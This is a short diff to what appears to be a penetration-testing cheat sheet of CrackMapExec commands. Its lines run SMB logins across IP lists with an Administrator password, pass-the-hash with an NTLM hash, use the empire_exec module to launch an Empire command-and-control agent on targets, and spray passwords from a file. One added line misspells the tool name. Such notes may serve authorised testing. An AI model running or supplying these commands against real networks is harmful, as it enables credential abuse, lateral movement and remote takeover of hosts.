@@ -10,4 +10,6 @@ crackmapexec ip_new.txt -t 100 -u Administrator -p 'XXXXXX' -d WORKGROUP
 
 === NEW ===
 
-crackmapexec smb IPs.txt -u User -H 33445678902bbbe760ea1f1234567890 -M empire_exec -o LISTENER=CME
+crackmapexec.py smb IPs.txt -u User -H 33445678902bbbe760ea1f1234567890 -M empire_exec -o LISTENER=CME
+
+crackmapexe.py 10.10.10.10 -u dude -p /home/passfile.txt
